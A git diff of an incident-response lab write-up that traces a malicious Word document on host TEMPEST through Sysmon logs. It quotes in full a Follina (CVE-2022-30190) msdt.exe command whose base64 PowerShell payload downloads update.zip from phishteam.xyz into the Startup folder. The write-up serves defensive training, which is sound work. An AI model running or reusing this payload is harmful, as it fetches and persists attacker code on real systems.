@@ -1,4 +1,4 @@
-Tempest Incident
+# Tempest Incident
 
 In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a CRITICAL severity that needs further investigation.
 
@@ -20,31 +20,42 @@ Investigation Guide
 Significant Data Sources:
  - Sysmon
 
+---
 
+# Part 1: Initial Access
 
+I started by saving sysmon logs as CSV & XML so I can open them in Timeline Explorer and Sysmon View.
 
-Saved sysmon logs as CSV & XML so I can open them in Timeline Explorer and Sysmon View.
 <img width="439" height="530" alt="image" src="https://github.com/user-attachments/assets/f3db0e3f-3618-41da-b8a2-1911ef1aaa1b" />
 
 In Sysmon View I looked into child processes of WINWORD.exe. 
+
 <img width="900" height="794" alt="image" src="https://github.com/user-attachments/assets/df58b01a-ea1e-4b0a-b3c0-029b6855e4ed" />
 
 
+I discovered a file created in the Downloads directory of user `benimaru`
 
-Discovered a file created in the Downloads directory of user `benimaru`
 Full file path: `C:\Users\benimaru\Downloads\~$ee_magicules.doc`
 
 Malicious .doc file identified as `ee_magicules.doc`
+
 Looking at the timestamp of the event I pivoted back to the sysmon events in event viewer, located the event there and identified the compromised machine name user benimaru used as **TEMPEST**
+
 <img width="601" height="619" alt="image" src="https://github.com/user-attachments/assets/c2b5bf95-c0fc-45e4-af0e-4a247ddeb3a5" />
 
-
 Back in the Sysmon View application I identified the PID of the Microsoft Word process that opened the malicious document as `496`
+
 <img width="729" height="564" alt="image" src="https://github.com/user-attachments/assets/d9049933-d4fb-4c5e-be6a-1199786feed8" />
 
 Looking at the network connection chain of events I located the IPv4 address associated with the malicious domain `phishteam.xyz`
+
 <img width="368" height="466" alt="image" src="https://github.com/user-attachments/assets/d84040fe-8ada-43ee-830d-c8a668b28144" />
 
+Jumping back into the event viewer I followed the chain of events that occurred after the malicious .doc file was created. I found a suspicious command containing what appears to be base64 encoded text
 
+`C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"`
 
+<img width="859" height="765" alt="image" src="https://github.com/user-attachments/assets/60708ea7-39a9-4c64-9297-c51cc2f1ae75" />
 
+The command runs `msdt.exe` which is abused by attackers for Remote Code Execution under the CVE-2022-30190
+Otherwise known as Follina. This vulnerability allows attackers to use malicious word documents to invoke Microsoft Support Diagnostic Tool (MSDT) to gain RCE.
